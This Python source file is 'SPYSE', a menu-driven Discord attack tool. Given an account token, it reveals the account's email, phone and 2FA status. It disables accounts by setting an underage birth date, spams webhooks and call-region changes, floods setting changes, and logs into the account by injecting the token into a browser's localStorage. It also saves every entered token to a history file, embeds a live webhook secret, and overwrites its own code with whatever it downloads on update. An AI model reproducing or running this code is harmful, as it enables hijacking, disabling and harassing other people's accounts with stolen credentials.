#version test 3
import sys
import requests
import colorama
from colorama import *
import random
import time 
import rich
from rich import * 
import os 
from os import system
from selenium import webdriver
import pathlib
from encodings import utf_8


console = get_console()

maj = 'V4.1.6'
webhook_report = "https://discord.com/api/webhooks/1024752077622218823/2ggeu3AOw5W_mw2FUsNSP_v0SPrZeEM5F26wZyXK6E6DKKS5yZWAtlRn0011BC4phDph"
#please don't spam or nuke this one it's really important for the tool

def version():
    r = requests.get("https://raw.githubusercontent.com/heygdrg/Spyse/main/version.txt")
    mode = r.text
    with open('version.txt') as file:
        txt = file.read()
    if mode == txt:
        time.sleep(1)
    else:
        os.system('cls||clear')
        os.system("Title - SPYSE New Update Found!")
        update_banner = f'''[red]
                
                ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
                ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
                ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
                ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝[/red]
                    
                                [red]Looks like this SPYSE {maj} is outdated [/red]'''
        console.print(update_banner)
        print()
        print()
        fin = str(console.input(f'[yellow][>>>][/yellow]You want to update to the latest version? (y/n):'))
        if fin == "n":
            pass
        else:
            d = requests.get('https://raw.githubusercontent.com/heygdrg/Spyse/main/common.py')
            update = d.text
            with open('common.py', "w", encoding="utf-8") as file:
                file.write(update)
            e = requests.get('https://raw.githubusercontent.com/heygdrg/Spyse/main/version.txt')
            up = e.text
            with open('version.txt', "w", encoding="utf-8") as file:
                file.write(up)
    os.system('cls||clear')

def validate_webhook(webhook):
    with open('history.txt', "a+") as file:
        file.write(f"{webhook}\n")
        file.close()
    try:
        stat = requests.get(webhook).json()
        print(stat)
        try: 
            stat = stat['name']
            error = "3" 
        except:
            stat = stat['message']
            error = "2" 
    except:
        error = "1"
    if error == "3":
        pass
    if error == '2':
        console.print('[green][[/green][purple]![/purple][green]][/green][purple] Webhook invalid ! [/purple] ')
        console.print(f"[green][[/green][purple]![/purple][green]][/green] Error = {stat}")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()
    if error == '1':
        console.print('[green][[/green][purple]![/purple][green]][/green][purple]Webhook invalid ! [/purple] ')
        console.print(f"[green][[/green][purple]![/purple][green]][/green]Error = Invalid URL")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()

def validateToken(token):
    r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
    if r.status_code == 200:
        
        with open('history.txt', "a+") as file:
            file.write(f"{token}\n")
            file.close()
            pass
        
    else:
        print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
        console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()

def getheaders(token):

    headers =     {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    }

    if token:
        headers.update({"Authorization": token})
        return headers

def setting():
    setting_banner = """
    [purple]╔════════════╗[/purple]
    [green]{[/green][purple]1[/purple][green]}[/green] Proxies 
    [green]{[/green][purple]2[/purple][green]}[/green] Licence
    [green]{[/green][purple]3[/purple][green]}[/green] Exit 
    [purple]╚════════════╝[/purple]
    """
    print(setting_banner)
    choice = console.input("[green][[/green][purple]?[/purple][green]][/green][purple] Your choice :[/purple] ")
    if choice == "3":
        main()
    if choice == "1":
        console.print("[green]setting proxies successfully[/green]")
        main()
    if choice == "2":
        print()
        console.print("[green]Discord : [/green][purple]BKS#1958[/purple]")
        console.print("[green]shop : [/green][purple]https://discord.gg/Dvu6s4TBFP[/purple]")
        console.print('[green]github = [/green][purple]https://github.com/heygdrg[/purple]')
        console.print('[green]github = [/green][purple]https://github.com/CSM-BlueRed[/purple]')
        print()
        console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        
        main()

def history():
    token = []
    token = pathlib.Path('history.txt').read_text()
    console.print(f"""[purple]╔════════[green]<<< history info >>>[/green]═════════════╗[/purple]
[green]{token}
                      [purple]╚═════════════════════════════════════════╝[/purple]
""")
    console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    main()

def report():
    message = console.input("[green][[/green][purple]?[/purple][green]][/green] [purple]tell us what wrong [please join your discord #][/purple] : ")
    r = requests.post(webhook_report,json={'username': 'SPYSE report bot', 'content': message})
    console.print("[green][[/green][purple]![/purple][green]][/green] [purple]report succesfully sent thank you for your support[/purple]")
    console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    main()

def token_info():
    os.system(f'Title - Spyse - Token info')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    r = requests.get('https://discord.com/api/v6/users/@me', headers=getheaders(token)).json()
    username = r['username']
    hastag = r["discriminator"]
    id = r['id']
    bio = r['bio']
    language = r['locale']
    phone = r['phone']
    email = r['email']
    mfa = r['mfa_enabled']
    userid = username + hastag


    console.print(f'''
[purple]<<────────────[/purple][green]{username}[/green][purple]────────────>>[/purple]
[green][[/green][purple]User ID[/purple][green]][/green]         {userid}
[green][[/green][purple]bio[/purple][green]][/green]             {bio}
[green][[/green][purple]Language[/purple][green]][/green]        {language}
[green][[/green][purple]Token[/purple][green]][/green]           {token}
[purple]<───────────[/purple][green]Security Info[/green][purple]───────────>[/purple]
[green][[/green][purple]2 Factor[/purple][green]][/green]        {mfa}
[green][[/green][purple]Email[/purple][green]][/green]           {email}
[green][[/green][purple]Phone number[/purple][green]][/green]    {phone if phone else ""}
                    ''')
    tr = requests.get("https://discord.com/api/v9/users/749504447989940235/profile?with_mutual_guilds=false",headers=getheaders(token)).json()
    account = tr['connected_accounts']
    print(account)

    console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    main()


def BioChanger():
    os.system(f'Title - Spyse - Bio changer')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    bio = console.input("[green][[/green][purple]?[/purple][green]][/green] enter the [purple]new bio[/purple] : ")
    custom_bio = {"bio": str(bio)}
    try:
        requests.patch("https://discord.com/api/v9/users/@me", headers=getheaders(token), json=custom_bio)
        console.print(f"[green][[/green][purple]![/purple][green]][/green]\n{Fore.GREEN}Bio changed to {Fore.WHITE}{bio}{Fore.GREEN} ")
        console.input("[green][[/green][purple]?[/purple][green]][/green] Enter anything to [purple]anything[/purple]. . . ")
    except Exception as e:
        console.print(f"[green][[/green][purple]![/purple][green]][/green] {Fore.RED}Error:\n{e}\nOccurred while trying to change the status :/")
    console.input("[green][[/green][purple]?[/purple][green]][/green] Enter anything to [purple]anything[/purple]. . . ")
    main()

def StartSeizure():
    os.system(f'Title - Spyse - Seizure')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    console.print("[green][[/green][purple]![/purple][green]][/green]\"ctrl + c\" at anytime to [purple]stop[/purple]\n")
    while True:
            setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
            console.print("[green][[/green][purple]![/purple][green]][/green] [purple]processing[/purple]")

def token_sender():
    os.system(f'Title - Spyse - Token sender')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    channel = console.input("[green][[/green][purple]?[/purple][green]][/green][purple] Channel[/purple] : ")
    message = console.input(f"[green][[/green][purple]?[/purple][green]][/green] Enter the text you want to[purple] send[/purple] : ")
    setting = {'content': message}
    r = requests.post(f'https://discord.com/api/v9/channels/{channel}/messages', headers=getheaders(token), json = setting).json()
    console.print("[green][[/green][purple]![/purple][green]][/green] message [red]sent[/red]")
    console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    main()

def spamer():
    os.system(f'Title - Spyse - Call crasher')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    channel = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Channel[/purple] : ")
    console.print("[green][[/green][purple]![/purple][green]][/green][green]"ctrl + c" at anytime to [/green][purple]stop[/purple]")
    try:
        for i in range(500):
            setting = {'region': random.choice(['brazil','hongkong','india','japan','rotterdam','russia','russia','southafrica','us-east','us-south','us-west'])}
            r = requests.patch(f'https://discord.com/api/v9/channels/{channel}/call', headers=getheaders(token), json = setting)
            console.print(f"[green][[/green][purple]![/purple][green]][/green] region changed to [red]{setting}[/red]")
        console.print("[red][[/red][purple]![/purple][red]][/red] Attack [red]finish[/red]")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()
    except:
        console.print("[red][[/red][purple]![/purple][red]][/red] An error [red]occured[/red]")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()

def tokendisable():
    os.system(f'Title - Spyse - token nuker')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    res = requests.patch('https://discordapp.com/api/v9/users/@me', headers=getheaders(token), json={'date_of_birth': '2014-2-11'})

    if res.status_code == 400:
        res_message = res.json().get('date_of_birth', ['no response message'])[0]

        if res_message == "You need to be 13 or older in order to use Discord.":
            console.print(f'[green][[/green][purple]![/purple][green]][/green] \n{Fore.RED}Token successfully disabled!{Fore.RESET}\n')
        elif res_message == "You cannot update your date of birth.":
            console.print('[green][[/green][purple]![/purple][green]][/green] Account can\'t be [purple]disabled[/purple]')
        else:
            console.print(f'[green][[/green][purple]![/purple][green]][/green] Unknown [purple]response[/purple] : {res_message}')
    else:
        console.print('[green][[/green][purple]![/purple][green]][/green] Failed to disable [purple]account[/purple]')
    console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    main()

def Leaver():
    os.system(f'Title - Spyse - server leaver')
    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
    validateToken(token)
    guilds = console.input("[green][[/green][purple]?[/purple][green]][/green] enter the [purple]guilds id[/purple] : ")
    response = requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guilds}', headers={'Authorization': token})
    fact = response.status_code
    try:
        if fact == 200 or 204 or 201 or 202:
            console.print(f"[green][[/green][purple]?[/purple][green]][/green] Left guild: [blue]{guilds}[/blue]")
            console.input(f'[green][[/green][purple]![/purple][green]][/green] Enter anything to continue. . . ')
            main()
        if fact == 404:
            console.print("[red][[/red][purple]![/purple][red]][/red] An error [red]occured[/red]")
            console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
            main()
    except:
        console.print("[red][[/red][purple]![/purple][red]][/red] An error [red]occured[/red]")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()

def Webhook_Spammer():
    try:
        os.system(f'Title - Spyse - Webhook spamer')
        webhook = console.input('[green][[/green][purple]?[/purple][green]][/green] enter [purple]webhook[/purple] : ')
        validate_webhook(webhook)
        r = requests.get(webhook).json()
        name = r['name']
        try:
            Message = console.input("[green][[/green][purple]?[/purple][green]][/green] what you want to [purple]say[/purple] : ")
            print("\"ctrl + c\" at anytime to stop\n")
            time.sleep(1.5)
            for i in range(30):
                console.print(f'[green][[/green][purple]![/purple][green]][/green] Message sent to [purple]{name}[/purple] ')
                response = requests.post(
                    webhook, json = {"content" : Message}, params = {'wait' : True})
            console.print(f'[green][[/green][purple]?[/purple][green]][/green] Spammed [purple]Webhook Successfully! [/purple]')
            console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
            main()
        except:
            console.print("[red][[/red][purple]?[/purple][red]][/red] An error occured. . . ")
            console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
            main()
    except:
        console.print("[red][[/red][purple]?[/purple][red]][/red] An error occured. . . ")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()

def webhook_deleter():
    try:
        os.system(f'Title - Spyse - Webhook deleter')
        webhook = console.input(f'[green][[/green][purple]?[/purple][green]][/green]Enter [purple]webhook URL[/purple]: ')
        validate_webhook(webhook)
        stat = requests.get(webhook).json()
        name = stat['name']
        r = requests.delete(webhook)
        print(f'[green][[/green][purple]![/purple][green]][/green] Delete webhook [purple]name {name}[/purple]! ')
        console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()
    except:
        console.print("[red][[/red][purple]?[/purple][red]][/red] An error occured. . . ")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        pass

def DmDeleter():

    os.system('Title - Spyse - Dm deleter')
    console.input('[green][[/green][purple]?[/purple][green]][/green] This tool is [purple]not available in this version ![/purple] ')
    console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    #token = console.input("[green][[/green][purple]?[/purple][green]]Enter [purple]token[/purple] : ")
    #validateToken(token)
    #channel = console.input("[green][[/green][purple]?[/purple][green]]Enter [purple]channel id to delete[/purple] : ")
    #requests.delete(f'https://discord.com/api/v9/channels/{channel}?silent=false', headers=getheaders(token))
    #print(f"[green][[/green][purple]![/purple][green]]Deleted DM: [purple]{channel}[/purple]")
    #console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
    main()

def Token_login():
    os.system('Title - Spyse - Token login')
    token = console.input("[green][[/green][purple]?[/purple][green]][/green]Enter [purple]token[/purple] : ")
    validateToken(token)
    try:
        driver = webdriver.Chrome('chromedriver.exe')
        j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
        user = j["username"] + "#" + str(j["discriminator"])
        script = """
                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"%s"`
                location.reload();
                """ % (token)
        console.print(f"[green][[/green][purple]![/purple][green]][/green] Connecting to {user}")
        driver.get("https://discordapp.com/login")
        driver.execute_script(script)
        main()
        time.sleep(5)
        main()
        while True: 
            pass
    except:
        console.print("[red][[/red][purple]?[/purple][red]][/red] An error occured. . . ")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()
        

def statut_changer():
    console = get_console()
    os.system('Title - Spyse - status changer')
    token = console.input("[green][[/green][purple]?[/purple][green]][/green]Enter [purple]token[/purple] : ")
    validateToken(token)
    console.print("""[purple]╔════════════╗[/purple]
[green]{[/green][purple]1[/purple][green]} Offline[/green]
[green]{[/green][purple]2[/purple][green]} Online[/green]
[green]{[/green][purple]3[/purple][green]} Do not disturb [/green]
[purple]╚════════════╝[/purple]""")
    status = console.input("[green][[/green][purple]?[/purple][green]][/green] [purple]Your choice[/purple] : ")
    if status == "1":
        mode = "invisible"
    elif status == "2":
        mode = "online"
    if status == "3":
        mode = "dnd"
    if status not in "1" "2" "3" :
        console.print("[red][[/red][purple]?[/purple][red]][/red] An error occured. . . ")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()
    setting = {'status': mode}
    r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=getheaders(token), json=setting).json()
    stat = r["status"]
    if stat:
        console.print(f'[green][[/green][purple]![/purple][green]][/green] Statut set to [purple]{stat}[/purple]')
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()
    else:
        print('ceheck 8 ')
        console.print("[red][[/red][purple]?[/purple][red]][/red] An error occured. . . ")
        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
        main()


def main():
    os.system('cls||clear')
    version()
    sether = os.getlogin()
    os.system(f'Title - Spyse - {maj} - connected as : {sether}')
    os.system('cls||clear')

    banner = """
            
                                    [green]███████[/green][purple]╗[green]██████[/green][purple]╗ [green]██[/green][purple]╗   [green]██[/green][purple]╗[green]███████[/green][purple]╗[green]███████[/green][purple]╗    
                                    [green]██[/green][purple]╔════╝[green]██[/green][purple]╔══[green]██[/green][purple]╗╚[green]██[/green][purple]╗ [green]██[/green][purple]╔╝[green]██[/green][purple]╔════╝[green]██[/green][purple]╔════╝    
                                    [green]███████[/green][purple]╗[green]██████[/green][purple]╔╝ ╚[green]████[/green][purple]╔╝ [green]███████[/green][purple]╗[green]█████[/green][purple]╗      
                                    [purple]╚════[green]██[/green]║[green]██[/green]╔═══╝   ╚[green]██[/green]╔╝  ╚════[green]██[/green]║[green]██[/green]╔══╝      
                                    [green]███████[/green]║[green]██[/green]║        [green]██[/green]║   [green]███████[/green]║[green]███████[/green]╗    
                                    ╚══════╝╚═╝        ╚═╝   ╚══════╝╚══════╝    
                            ╔═══════════════════════════════════════════════════╗                                             
                            ║  [green]{[/green][purple]1[/purple][green]}[/green] [red]Dm deleter[/red]              [green]{[/green][purple]9[/purple][green]}[/green] Server leaver    ║
                            ║  [green]{[/green][purple]2[/purple][green]}[/green] Webhook deleter         [green]{[/green][purple]10[/purple][green]}[/green] Seizure         ║
                            ║  [green]{[/green][purple]3[/purple][green]}[/green] Webhook spamer          [green]{[/green][purple]11[/purple][green]}[/green] Token info      ║
                            ║  [green]{[/green][purple]4[/purple][green]}[/green] Bio changer             [green]{[/green][purple]12[/purple][green]}[/green] Token sender    ║
                            ║  [green]{[/green][purple]5[/purple][green]}[/green] Token nuker             [green]{[/green][purple]13[/purple][green]}[/green] Setting         ║                                                                                                                                                 
                            ║  [green]{[/green][purple]6[/purple][green]}[/green] Login token             [green]{[/green][purple]14[/purple][green]}[/green] Make a report   ║
                            ║  [green]{[/green][purple]7[/purple][green]}[/green] Status changer          [green]{[/green][purple]15[/purple][green]}[/green] History         ║
                            ║  [green]{[/green][purple]8[/purple][green]}[/green] Call crasher            [green]{[/green][purple]16[/purple][green]}[/green] Exit            ║
                            ╚═══════════════════════════════════════════════════╝
                 
    """

    console.print(banner)

    choice = console.input("[green][[/green][purple]?[/purple][green]][/green][purple] Your choice :[/purple] ")
    if choice == "1":
        DmDeleter()
    if choice == "2": 
        webhook_deleter()
    if choice == "3":
        Webhook_Spammer()
    if choice == "4":
        BioChanger()
    if choice == "5":
        tokendisable()
    if choice == "6":
        Token_login()
    if choice == "7":
        statut_changer()
    if choice == "8":
        spamer()
    if choice == "9":
        Leaver()
    if choice == "10":
        StartSeizure
    if choice == "11":
        token_info()
    if choice == "12":
        token_sender()
    if choice == "13":
        setting()
    if choice == "14":
        report()
    if choice == "15":
        history()
    if choice == "16":
        raise SystemExit
    else:
        os.system('cls||clear')
        main()

if sys.argv[1] == 'cle123': main()
